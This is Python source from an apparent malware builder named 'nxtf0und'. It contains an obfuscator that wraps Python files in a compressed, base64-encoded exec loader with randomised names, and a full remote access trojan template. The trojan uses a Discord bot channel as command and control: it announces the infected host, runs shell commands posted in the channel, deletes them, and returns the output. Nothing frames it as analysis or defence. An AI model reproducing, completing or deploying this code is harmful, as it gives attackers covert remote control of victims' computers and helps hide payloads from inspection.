def cmd_obfuscator(nf):
    nf.section("obfuscator tool")
    src = nf.ask("python file to obfuscate")
    if not src or not os.path.isfile(src):
        nf.finding("HIGH", "file not found", src or "-")
        return
    with open(src, "rb") as fh:
        raw = fh.read()
    blob = base64.b64encode(zlib.compress(raw, 9)).decode()
    tag = lambda n: "".join(random.choice(string.ascii_letters) for _ in range(n))
    v = {k: tag(9) for k in ("b64", "zlib", "blob", "code", "exec")}
    loader = (
        "#!/usr/bin/env python3\n"
        f"import base64 as {v['b64']}, zlib as {v['zlib']}\n"
        f"{v['blob']} = (\n"
    )
    for i in range(0, len(blob), 96):
        loader += f"    \"{blob[i:i + 96]}\"\n"
    loader += (
        ")\n"
        f"{v['code']} = {v['zlib']}.decompress({v['b64']}.b64decode({v['blob']}))\n"
        f"{v['exec']}(compile({v['code']}, '<nf>', 'exec'))\n"
    )
    os.makedirs(os.path.join(BASE_DIR, "builds"), exist_ok=True)
    out = os.path.join(BASE_DIR, "builds",
                       f"obf_{os.path.splitext(os.path.basename(src))[0]}_"
                       f"{time.strftime('%Y%m%d-%H%M%S')}.py")
    with open(out, "w", encoding="utf-8") as fh:
        fh.write(loader)
    nf.finding("OK", "obfuscated", out)
    nf.kv("original bytes", len(raw), )
    nf.kv("loader bytes", len(loader))
    nf.note("zlib + base64 + generated identifiers; trivially reversible by design")

RAT_TEMPLATE = r'''#!/usr/bin/env python3
# generated by nxtf0und — discord c2 client
import json
import os
import platform
import subprocess
import time
import urllib.request

BOT_TOKEN = "__BOT__"
CHANNEL_ID = "__CHANNEL__"
API = "https://discord.com/api/v10"
HEADERS = {"Authorization": "Bot " + BOT_TOKEN,
           "User-Agent": "Mozilla/5.0",
           "Content-Type": "application/json"}
STATE = {"cwd": os.path.expanduser("~")}

def api(path, method="GET", payload=None):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(API + path, data=data, headers=HEADERS,
                                 method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read(200000)
            return resp.status, json.loads(body) if body else None
    except Exception as exc:
        return 0, {"error": str(exc)}

def reply(text):
    for start in range(0, len(text), 1900):
        api("/channels/" + CHANNEL_ID + "/messages",
            "POST", {"content": "```" + text[start:start + 1900] + "```"})

def boot():
    api("/channels/" + CHANNEL_ID + "/messages", "POST",
        {"content": "nxtf0und rat online: " + platform.node()})
    seen = set()
    while True:
        status, msgs = api("/channels/" + CHANNEL_ID + "/messages?limit=10")
        if status == 200 and isinstance(msgs, list):
            for msg in reversed(msgs):
                mid = msg.get("id")
                if mid in seen or msg.get("author", {}).get("bot"):
                    continue
                seen.add(mid)
                content = (msg.get("content") or "").strip()
                if not content.startswith("!"):
                    continue
                command = content[1:]
                api("/channels/" + CHANNEL_ID + "/messages/" + mid, "DELETE")
                if command == "cd":
                    reply(STATE["cwd"])
                    continue
                if command.startswith("cd "):
                    target = os.path.expanduser(command[3:].strip())
                    if os.path.isdir(target):
                        STATE["cwd"] = target
                        reply("cwd: " + target)
                    else:
                        reply("no such dir")
                    continue
                try:
                    out = subprocess.check_output(
                        command, shell=True, cwd=STATE["cwd"],
                        stderr=subprocess.STDOUT, timeout=120)
                    text = out.decode("utf-8", "replace") or "(no output)"
                except Exception as exc:
                    text = "error: " + str(exc)
                reply(text[-9000:])
        time.sleep(3)

if __name__ == "__main__":
    boot()
'''

